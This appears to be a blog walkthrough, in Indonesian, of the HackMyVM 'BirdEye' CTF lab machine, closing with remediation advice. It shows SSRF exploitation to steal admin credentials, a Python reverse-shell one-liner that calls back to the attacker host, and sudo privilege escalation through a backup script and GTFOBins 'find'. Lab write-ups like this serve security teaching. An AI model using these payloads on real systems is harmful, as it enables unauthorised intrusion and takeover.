---
layout: post
title: "HackMyVm-Birdeye"
date: 2025-11-01 02:15:00 +0700
categories: [HackMyVm, Medium]
tags: [ssrf, privilege-escalation, linux, web-security]
image:
  path: /assets/img/post/HackMyVm-Birdeye/banner.png
author: HanzXD
---

## Overview

BirdEye adalah mesin CTF yang menampilkan kerentanan SSRF (Server-Side Request Forgery) yang dapat dieksploitasi untuk mengakses panel admin internal dan mendapatkan akses root melalui privilege escalation.

**Difficulty:** Medium  
**Target IP:** 192.168.56.105

---

## Reconnaissance

### Port Scanning

Memulai dengan scan menggunakan Nmap untuk mengidentifikasi service yang berjalan:

```bash
nmap -sS -sC -sV -T5 192.168.56.105
```

**Hasil Scan:**

```
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.6.9)
```

Port yang teridentifikasi:
- **Port 53** - DNS (ISC BIND 9.11.3)
- **Port 80** - HTTP (Apache 2.4.29)
- **Port 5000** - HTTP (Werkzeug/Python)

---

## Web Enumeration

![Web Interface](/assets/img/post/HackMyVm-Birdeye/foto1.png)

### Directory Bruteforcing

Menggunakan Feroxbuster untuk enumerasi direktori:

```bash
feroxbuster -u http://192.168.56.105/ 
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
--filter-status 404 --scan-dir-listings
```

**Endpoint Menarik yang Ditemukan:**

```
200 GET  /
200 GET  /index.html
308 GET  /admin => /admin/
401 GET  /admin/dashboard
403 GET  /admin/config
```

Endpoint `/admin/dashboard` dan `/admin/config` terlihat menjanjikan untuk diselidiki lebih lanjut.

---

## Vulnerability Discovery - SSRF

### Identifying the SSRF Vector

Ketika mencoba menggunakan form search pada aplikasi web, saya mengintercept request menggunakan Burp Suite dan menemukan endpoint yang mencurigakan:

![Burp Suite Intercept](/assets/img/post/HackMyVm-Birdeye/foto2.png)

```http
GET /api/fetch-url?url=http%3A%2F%2Flocalhost%3A5000%2Fapi%2Fproducts%2F%3Fsearch%3D%22HELLO%22
```

Parameter `url` dalam endpoint `/api/fetch-url` mengindikasikan potensi kerentanan **SSRF**.

### What is SSRF?

![SSRF Concept](/assets/img/post/HackMyVm-Birdeye/foto3.png)

Server-Side Request Forgery (SSRF) adalah kerentanan keamanan web yang memungkinkan penyerang memaksa aplikasi sisi server untuk membuat permintaan HTTP ke lokasi yang tidak diinginkan. Dalam serangan SSRF, penyerang dapat:
- Mengakses layanan internal yang tidak dapat diakses dari luar
- Membocorkan data sensitif seperti kredensial
- Bypass kontrol akses berbasis IP

### Exploiting SSRF

Mencoba mengakses endpoint admin yang sebelumnya terblokir:

**Request 1 - Dashboard (Unauthorized):**
```http
GET /api/fetch-url?url=http://localhost:5000/admin/dashboard
```

**Response:**
```json
{
  "error": "Unauthorized"
}
```

**Request 2 - Config (Success!):**
```http
GET /api/fetch-url?url=http://localhost:5000/admin/config
```

**Response:**
```json
{
  "admin_password": "SuperSecret123!",
  "admin_user": "superadmin",
  "login_panel_path": "/admin/panelloginpage"
}
```

**Berhasil!** Kita mendapatkan kredensial admin melalui SSRF:
- **Username:** `superadmin`
- **Password:** `SuperSecret123!`
- **Login Path:** `/admin/panelloginpage`

---

## Bypassing Internal-Only Access

### Accessing the Login Panel

Mencoba mengakses login panel secara langsung:

```bash
curl -i http://192.168.56.105/admin/panelloginpage
```

**Response:**
```
HTTP/1.1 403 Forbidden
Forbidden - Internal access only
```

Panel login hanya dapat diakses secara internal. Kita perlu menggunakan SSRF untuk mengaksesnya:

```http
GET /api/fetch-url?url=http://localhost:5000/admin/panelloginpage
```

Berhasil! Login form ditampilkan melalui proxy SSRF.

![Login Panel via SSRF](/assets/img/post/HackMyVm-Birdeye/foto4.png)

### Authentication via SSRF POST Request

Karena halaman di-render melalui `/fetch-url`, kita tidak dapat login secara langsung. Kita perlu mengirim POST request melalui endpoint SSRF.

**Memeriksa Method yang Diizinkan:**

```bash
curl -iX OPTIONS "http://192.168.56.105/api/fetch-url?url=http://localhost/admin/panelloginpage"
```

**Response:**
```
Allow: HEAD, GET, POST, OPTIONS
Access-Control-Allow-Methods: GET, POST, OPTIONS
```

POST method diizinkan! Sekarang kita dapat mengirim kredensial.

**Login Request via SSRF:**

```http
POST /api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST HTTP/1.1
Host: 192.168.56.105
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

admin_user=superadmin&admin_password=SuperSecret123!
```

> **Catatan Penting:** Parameter `&method=POST` sangat krusial. Tanpa ini, endpoint akan menggunakan GET sebagai default method.

**Response:**

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aQUYRg._-DZobnqTyLDRYB2cKMu8aYam7o; Domain=192.168.1.237; Path=/

<h2>Admin Dashboard</h2>
<form method="post">
    <label>Command: <input name="command" type="text"></label>
    <button type="submit">Run</button>
</form>
```

**Sukses!** Kita mendapatkan session cookie dan akses ke admin dashboard yang memiliki fitur eksekusi command.

### Accessing Dashboard with Cookie

Menggunakan Cookie Editor di browser, saya menambahkan session cookie yang didapat dan mengakses `/admin/dashboard` secara langsung. Dashboard admin berhasil diakses!

![Admin Dashboard Access](/assets/img/post/HackMyVm-Birdeye/foto5.png)

---

## Initial Access - Reverse Shell

### Gaining Shell Access

Dashboard admin memiliki form untuk menjalankan command. Kita dapat menggunakannya untuk mendapatkan reverse shell.

**Setup Listener:**

```bash
nc -lvnp 9001
```

**Payload:**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.103",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

Mengirim payload melalui form dan menekan tombol "Run".

**Shell Received:**

```bash
$ nc -lvnp 9001         
listening on [any] 9001 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.105] 44444

www-data@birdeye:~/birdeye/Server$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Initial access berhasil!** Kita sekarang memiliki shell sebagai user `www-data`.

---

## Privilege Escalation

### User Enumeration

Mengidentifikasi user yang ada di sistem:

```bash
www-data@birdeye:~/birdeye/Server$ cat /etc/passwd | grep "home"
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
sev:x:1000:1000:birdeye,,,:/home/sev:/bin/bash
```

Target user: **sev**

### Escalation: www-data → sev

Memeriksa sudo privileges untuk `www-data`:

```bash
www-data@birdeye:~/birdeye/Server$ sudo -l
User www-data may run the following commands on birdeye:
    (sev) NOPASSWD: /home/sev/backup_app.sh
```

User `www-data` dapat menjalankan `/home/sev/backup_app.sh` sebagai user `sev` tanpa password!

**Memeriksa Script:**

```bash
www-data@birdeye:~/birdeye/Server$ cat /home/sev/backup_app.sh
#!/bin/bash
/bin/bash -p
```

Script ini sangat sederhana - hanya menjalankan bash dengan flag `-p` (preserve privileges). Sempurna untuk privilege escalation!

**Escalating to sev:**

```bash
www-data@birdeye:~/birdeye/Server$ sudo -u sev /home/sev/backup_app.sh
sev@birdeye:~/birdeye/Server$ id
uid=1000(sev) gid=1000(sev) groups=1000(sev),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),112(lpadmin),113(sambashare),999(vboxsf)
```

**Berhasil!** Sekarang kita adalah user `sev`.

**User Flag:**

```bash
sev@birdeye:~$ cat /home/sev/user.txt
FLAG{wwwd4t4_t0_s3v_3sc4l4t10n}
```

### Escalation: sev → root

Memeriksa sudo privileges untuk user `sev`:

```bash
sev@birdeye:~$ sudo -l
User sev may run the following commands on birdeye:
    (ALL) NOPASSWD: /usr/bin/find
```

User `sev` dapat menjalankan command `find` sebagai root tanpa password. Ini adalah jalur klasik menuju root!

### Exploiting Find (GTFOBins)

Menggunakan teknik dari [GTFOBins](https://gtfobins.github.io/gtfobins/find/), kita dapat mengeksekusi shell melalui `find`:

```bash
sev@birdeye:~$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

**ROOT ACCESS ACHIEVED!** 🎉

**Root Flag:**

```bash
# cat /root/root.txt
FLAG{5ev1l_r00t_4cc3ss_4ch13v3d}
```

---

## Summary

### Flags Captured

- **User Flag:** `FLAG{wwwd4t4_t0_s3v_3sc4l4t10n}`
- **Root Flag:** `FLAG{5ev1l_r00t_4cc3ss_4ch13v3d}`

### Attack Chain

1. **Reconnaissance** - Port scanning mengidentifikasi HTTP services pada port 80 dan 5000
2. **Web Enumeration** - Directory bruteforcing menemukan endpoint admin yang restricted
3. **SSRF Discovery** - Menemukan kerentanan SSRF pada endpoint `/api/fetch-url`
4. **SSRF Exploitation** - Menggunakan SSRF untuk:
   - Mengakses `/admin/config` dan mendapatkan kredensial
   - Bypass restriction "internal-only" pada login panel
   - Melakukan authentication via POST request
5. **Initial Access** - Mendapatkan reverse shell melalui command execution di admin dashboard
6. **Privilege Escalation #1** - Eskalasi dari `www-data` ke `sev` menggunakan sudo privilege pada `backup_app.sh`
7. **Privilege Escalation #2** - Eskalasi dari `sev` ke `root` menggunakan sudo privilege pada `/usr/bin/find`

### Key Takeaways

- **SSRF** dapat digunakan untuk mengakses internal services yang tidak dapat diakses dari luar
- Selalu periksa endpoint yang mengambil URL sebagai parameter
- POST requests via SSRF dapat digunakan untuk melakukan authentication
- Misconfigured sudo permissions adalah jalur umum untuk privilege escalation
- GTFOBins adalah resource yang sangat berharga untuk binary exploitation

---

## Remediation Recommendations

1. **SSRF Protection:**
   - Implementasikan whitelist untuk URL yang diizinkan
   - Validasi dan sanitasi input URL
   - Disable redirect following
   - Gunakan network segmentation

2. **Access Control:**
   - Implementasikan authentication yang proper untuk semua admin endpoints
   - Jangan rely hanya pada IP-based restrictions
   - Gunakan CSRF tokens

3. **Sudo Privileges:**
   - Review dan minimize sudo permissions
   - Hindari memberikan akses sudo pada binaries yang dapat dieksploitasi (find, vim, etc.)
   - Implementasikan principle of least privilege

4. **Command Execution:**
   - Jangan pernah expose command execution functionality tanpa proper validation
   - Implementasikan command whitelisting
   - Gunakan prepared statements atau parameterized commands

---

Thanks for reading! Happy hacking! 🚀